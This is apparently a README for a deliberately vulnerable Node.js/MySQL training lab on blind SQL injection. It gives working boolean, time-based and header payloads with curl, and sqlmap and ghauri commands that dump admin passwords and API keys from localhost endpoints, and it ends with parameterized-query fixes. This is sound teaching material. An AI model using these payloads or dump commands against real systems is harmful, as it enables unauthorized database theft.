# Lab 02 — Blind SQL Injection (Boolean + Time-Based) 🔴

**Port:** `8002`  
**Stack:** Node.js + MySQL  
**Difficulty:** Intermediate

---

## 🕳️ Security Loopholes

### 1. Boolean-Based Blind SQLi
The `/users/exists` endpoint is injectable but only returns `true`/`false`. Attackers infer data by asking yes/no questions character by character.

### 2. Time-Based Blind SQLi
The `/orders/status` endpoint is injectable with numeric input — no quoting needed. Attackers use `SLEEP()` to exfiltrate data based on response time.

### 3. Header Injection
The `X-User-Id` header is directly interpolated — a common bypass when query params are sanitized but headers are not.

---

## 🎯 Attack Scenarios

### Scenario A — Boolean-Based: Extract Admin Password Character by Character

```bash
# First: confirm vulnerability
# TRUE condition — should return {exists: true}
curl "http://localhost:8002/users/exists?username=alice' AND '1'='1"

# FALSE condition — should return {exists: false}
curl "http://localhost:8002/users/exists?username=alice' AND '1'='2"

# Now extract: is first char of admin password > 'a'?
curl -G "http://localhost:8002/users/exists" \
  --data-urlencode "username=admin' AND SUBSTRING(password,1,1)>'a'-- -"

# Automate with sqlmap (boolean mode)
sqlmap -u "http://localhost:8002/users/exists?username=alice" \
  --dbms=mysql \
  --technique=B \
  --dump \
  --batch \
  --level=5
```

### Scenario B — Time-Based: Detect and Extract via SLEEP

```bash
# Confirm time-based: should delay ~3 seconds
curl -w "\nTime: %{time_total}s\n" \
  "http://localhost:8002/orders/status?order_id=1 AND SLEEP(3)-- -"

# Extract DB name character by character via timing
curl -w "\nTime: %{time_total}s\n" \
  "http://localhost:8002/orders/status?order_id=1 AND IF(SUBSTRING(database(),1,1)='s',SLEEP(3),0)-- -"

# Automate with sqlmap (time-based)
sqlmap -u "http://localhost:8002/orders/status?order_id=1" \
  --dbms=mysql \
  --technique=T \
  --dump-all \
  --batch
```

### Scenario C — Header-Based Injection

```bash
# Boolean-based via header
curl "http://localhost:8002/profile" -H "X-User-Id: 1 AND 1=1"
curl "http://localhost:8002/profile" -H "X-User-Id: 1 AND 1=2"

# Union-based (if columns match)
curl "http://localhost:8002/profile" \
  -H "X-User-Id: 0 UNION SELECT username,api_key FROM users WHERE is_admin=1-- -"

# sqlmap with custom header
sqlmap -u "http://localhost:8002/profile" \
  --headers="X-User-Id: 1" \
  -p "X-User-Id" \
  --dbms=mysql \
  --dump --batch
```

### Scenario D — Extract api_key from admin

```bash
# Using ghauri for blind extraction
ghauri -u "http://localhost:8002/users/exists?username=admin" \
  --dbms=mysql \
  --technique=B \
  --dump
```

---

## 🛠️ Tools

| Tool | Use |
|------|-----|
| `sqlmap` | `--technique=BT` for boolean+time based |
| `ghauri` | Better blind SQLi handling |
| `Burp Suite Intruder` | Automate character-by-character extraction |
| `curl -w "%{time_total}"` | Measure response times manually |

---

## 🔐 How to Fix

```javascript
// Parameterized queries with mysql2
const [rows] = await db.query(
  'SELECT id FROM users WHERE username = ? LIMIT 1',
  [username]
);

// Validate numeric input
const orderId = parseInt(req.query.order_id, 10);
if (isNaN(orderId)) return res.status(400).json({ error: 'Invalid ID' });

// Never trust headers for auth/identity
// Use signed JWTs or server-side sessions instead of X-User-Id headers
```
